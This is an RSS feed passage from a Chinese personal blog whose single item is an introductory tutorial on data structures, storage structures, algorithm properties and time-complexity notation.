<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xsl" href="https://sankgao.github.io/rss.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <atom:link href="https://sankgao.github.io/rss.xml" rel="self" type="application/rss+xml"/>
    <title>Sank&amp;apos;s blog</title>
    <link>https://sankgao.github.io/</link>
    <description>使用 VuePress-v2 搭建的个人博客</description>
    <language>zh-CN</language>
    <pubDate>Wed, 01 Nov 2023 06:52:17 GMT</pubDate>
    <lastBuildDate>Wed, 01 Nov 2023 06:52:17 GMT</lastBuildDate>
    <generator>vuepress-plugin-feed2</generator>
    <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
    <copyright>基于 MIT 协议，© 2023-至今 Sankgao</copyright>
    <category>Computer</category>
    <category>其它</category>
    <category>About</category>
    <category>DevOps</category>
    <category>Languages</category>
    <category>Framework</category>
    <category>Tools</category>
    <category>Frontend</category>
    <item>
      <title>数据结构</title>
      <link>https://sankgao.github.io/computers/base/data_structure.html</link>
      <guid>https://sankgao.github.io/computers/base/data_structure.html</guid>
      <source url="https://sankgao.github.io/rss.xml">数据结构</source>
      <description>算法和数据结构 数据结构的基本概念 基本概念和术语 1. 数据 数据 是信息的载体，是描述客观事物属性的数、字符及所有能输入到计算机中并被计算机程序识别和处理的符号的集合。数据是计算机程序加工的原料。 2. 数据元素 数据元素 是数据的基本单位，通常作为一个整体进行考虑和处理。一个数据元素可由若干数据项组成，数据项是构成数据元素的不可分割的最小单位。例...</description>
      <category>Computer</category>
      <pubDate>Wed, 01 Nov 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 算法和数据结构</h2>
<h3> 数据结构的基本概念</h3>
<h4> 基本概念和术语</h4>
<ol>
<li>
<p><strong>数据</strong></p>
<p>数据 <strong>是信息的载体</strong>，是描述客观事物属性的数、字符及所有能输入到计算机中并被计算机程序识别和处理的符号的集合。数据是计算机程序加工的原料。</p>
</li>
<li>
<p><strong>数据元素</strong></p>
<p>数据元素 <strong>是数据的基本单位</strong>，通常作为一个整体进行考虑和处理。一个数据元素可由若干数据项组成，<strong>数据项是构成数据元素的不可分割的最小单位</strong>。例如：学生记录就是一个数据元素，它由学号、姓名、性别等数据项组成。</p>
</li>
<li>
<p><strong>数据对象</strong></p>
<p>数据对象 <strong>是具有相同性质的数据元素的集合</strong>，是数据的一个子集。例如：整数数据对象是集合 <code>N = {0, ±1, ±2,}</code>。</p>
</li>
<li>
<p><strong>数据类型</strong></p>
<p>数据类型 <strong>是一个值的集合和定义在此集合上的一组操作的总称。</strong></p>
<ul>
<li><strong>原子类型</strong>：其值不可再分的数据类型</li>
<li><strong>结构类型</strong>：其值可以再分解为若干成分（分量）的数据类型</li>
<li><strong>抽象数据类型</strong>：抽象数据组织及与之相关的操作</li>
</ul>
</li>
<li>
<p><strong>数据结构</strong></p>
<p>数据结构 <strong>是相互之间存在一种或多种特定关系的数据元素的集合</strong>。在任何问题中，数据元素都不是孤立存在的，它们之间存在某种关系，这种数据元素相互之间的关系称为 <strong>结构（Structure）</strong>。<strong>数据结构包括三方面的内容</strong>：逻辑结构、存储结构和数据的运算。</p>
<p>数据的逻辑结构和存储结构是密不可分的两个方面，一个算法的设计取决于所选定的逻辑结构，而算法的实现依赖于所采用的存储结构。</p>
</li>
</ol>
<h4> 数据结构三要素</h4>
<ol>
<li>
<p><strong>数据的逻辑结构</strong></p>
<p>逻辑结构 <strong>是指数据元素之间的逻辑关系，即从逻辑关系上描述数据</strong>。它与数据的存储无关，是独立于计算机的。数据的逻辑结构 <strong>分为线性结构和非线性结构</strong>，线性表是典型的线性结构；集合、树和图是典型的非线性结构。数据的逻辑结构分类如下图所示：</p>
<figure><figcaption>数据的逻辑结构分类</figcaption></figure>
<ul>
<li><strong>集合</strong>：结构中的数据元素之间除 “同属一个集合” 外，别无其他关系</li>
<li><strong>线性结构</strong>：结构中的数据元素之间只存在一对一的关系</li>
<li><strong>树形结构</strong>：结构中的数据元素之间存在一对多的关系</li>
<li><strong>图状结构或网状结构</strong>：结构中的数据元素之间存在多对多的关系</li>
</ul>
</li>
<li>
<p><strong>数据的存储结构</strong></p>
<p>存储结构 <strong>是指数据结构在计算机中的表示</strong>（又称 <strong>映像</strong>），也称物理结构。它包括数据元素的表示和关系的表示。数据的存储结构是用计算机语言实现的逻辑结构，它依赖于计算机语言。<strong>数据的存储结构主要有</strong> 顺序存储、链式存储、素引存储和散列存储。</p>
<ul>
<li><strong>顺序存储</strong>：把逻辑上相邻的元素存储在物理位置上也相邻的存储单元中，元素之间的关系由存储单元的邻接关系来体现。其 <strong>优点是</strong> 可以实现随机存取，每个元素占用最少的存储空间；<strong>缺点是</strong> 只能使用相邻的一整块存储单元，因此可能产生较多的外部碎片</li>
<li><strong>链式存储</strong>：不要求逻辑上相邻的元素在物理位置上也相邻，借助指示元素存储地址的指针来表示元素之间的逻辑关系。其 <strong>优点是</strong> 不会出现碎片现象，能充分利用所有存储单元；<strong>缺点是</strong> 每个元素因存储指针而占用额外的存储空间，且只能实现顺序存取</li>
<li><strong>索引存储</strong>：在存储元素信息的同时，还建立附加的索引表。索引表中的每项称为索引项，索引项的一般形式是（关键字，地址）。其 <strong>优点是</strong> 检索速度快；<strong>缺点是</strong> 附加的索引表额外占用存储空间。另外，增加和删除数据时也要修改索引表，因而会花费较多的时间</li>
<li><strong>散列存储</strong>：根据元素的关键字直接计算出该元素的存储地址，又称 <strong>哈希（Hash）存储</strong>。其 <strong>优点是</strong> 检索、增加和删除结点的操作都很快；<strong>缺点是</strong> 若散列函数不好，则可能出现元素存储单元的冲突，而解决冲突会增加时间和空间开销</li>
</ul>
</li>
<li>
<p><strong>数据的运算</strong></p>
<p>施加在数据上的运算包括运算的定义和实现。运算的定义是针对逻辑结构的，指出运算的功能；运算的实现是针对存储结构的，指出运算的具体操作步骤。</p>
</li>
</ol>
<h3> 算法和算法评价</h3>
<h4> 算法的基本概念</h4>
<p><strong>算法（Algorithm）是对特定问题求解步骤的一种描述</strong> ，它是指令的有限序列，其中的每条指令表示一个或多个操作。此外，<strong>一个算法还具有下列五个重要特性：</strong></p>
<ul>
<li><strong>有穷性</strong>：一个算法必须总在执行有穷步之后结束，且每一步都可在有穷时间内完成</li>
<li><strong>确定性</strong>：算法中每条指令必须有确切的含义，对于相同的输入只能得出相同的输出</li>
<li><strong>可行性</strong>：算法中描述的操作都可以通过已经实现的基本运算执行有限次来实现</li>
<li><strong>输入</strong>：一个算法有零个或多个输入，这些输入取自于某个特定的对象的集合</li>
<li><strong>输出</strong>：一个算法有一个或多个输出，这些输出是与输入有着某种特定关系的量</li>
</ul>
<p>通常，设计一个 “好” 的算法应考虑达到以下目标：</p>
<ul>
<li><strong>正确性</strong>：算法应能够正确地解决求解问题</li>
<li><strong>可读性</strong>：算法应具有良好的可读性，以帮助人们理解</li>
<li><strong>健壮性</strong>：输入非法数据时，算法能适当地做出反应或进行处理，而不会产生莫名其妙的输出结果</li>
<li><strong>高效率与低存储量需求</strong>：效率是指算法执行的时间，存储量需求是指算法执行过程中所需要的最大存储空间，这两者都与问题的规模有关</li>
</ul>
<h4> 算法效率的度量</h4>
<p>算法效率的度量是通过时间复杂度和空间复杂度来描述的。</p>
<ol>
<li>
<p><strong>时间复杂度</strong></p>
<p><strong>一个语句的频度是指该语句在算法中被重复执行的次数</strong>。算法中所有语句的频度之和记为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，它是该算法问题规模 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的函数，时间复杂度主要分析 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 的数量级。算法中基本运算（最深层循环内的语句）的频度与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 同数量级，因此通常采用算法中基本运算的频度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 来分析算法的时间复杂度。因此，算法的时间复杂度记为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>O</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(n) = O(f(n))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">))</span></span></span></span> 式中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi></mrow><annotation encoding="application/x-tex">O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span></span> 的含义是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 的数量级，其严格的数学定义是：若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 是定义在正整数集合上的两个函数，则存在正常数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">n_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，使得当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>⩾</mo><msub><mi>n</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">n \geqslant n_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 时，都满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>⩽</mo><mi>T</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>⩽</mo><mi>C</mi><mi>f</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">0 \leqslant T(n) \leqslant Cf(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7811em;vertical-align:-0.1367em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p>
<p>算法的时间复杂度不仅依赖于问题的规模 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>，也取决于待输入数据的性质（如：输入数据元素的初始状态）。例如：在数组 <code>A[0…n-1]</code> 中，查找给定值 k 的算法大致如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>该算法中语句 <code>3</code>（基本运算）的频度不仅与问题规模 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 有关，而且与输入实例中 <code>A</code> 的各元素的取值及 <code>k</code> 的取值有关：</p>
<ul>
<li>若 <code>A</code> 中没有与 <code>k</code> 相等的元素，则语句 <code>3</code> 的频度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">f(n) = n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span></li>
<li>若 <code>A</code> 的最后一个元素等于 <code>k</code>，则语句 <code>3</code> 的频度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 是常数 <code>0</code></li>
</ul>
<p>一般总是考虑在最坏情况下的时间复杂度，以保证算法的运行时间不会比它更长。</p>
<ul>
<li><strong>最坏时间复杂度</strong>：是指在最坏情况下，算法的时间复杂度</li>
<li><strong>平均时间复杂度</strong>：是指所有可能输入实例在等概率出现的情况下，算法的期望运行时间</li>
<li><strong>最好时间复杂度</strong>：是指在最好情况下，算法的时间复杂度</li>
</ul>
<p>在分析一个程序的时间复杂性时，有以下两条规则：</p>
<ul>
<li><strong>加法规则</strong>：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>T</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>+</mo><msub><mi>T</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>O</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>+</mo><mi>O</mi><mo stretchy="false">(</mo><mi>g</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mi>O</mi><mo stretchy="false">(</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>g</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(n) = T_{1}(n) + T_{2}(n) = O(f(n)) + O(g(n)) = O(max(f(n),g(n)))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)))</span></span></span></span></li>
<li><strong>乘法规则</strong>：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>T</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>×</mo><msub><mi>T</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>O</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>×</mo><mi>O</mi><mo stretchy="false">(</mo><mi>g</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mi>O</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>×</mo><mi>g</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(n) = T_{1}(n) \times T_{2}(n) = O(f(n)) \times O(g(n)) = O(f(n) \times g(n))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">))</span></span></span></span></li>
</ul>
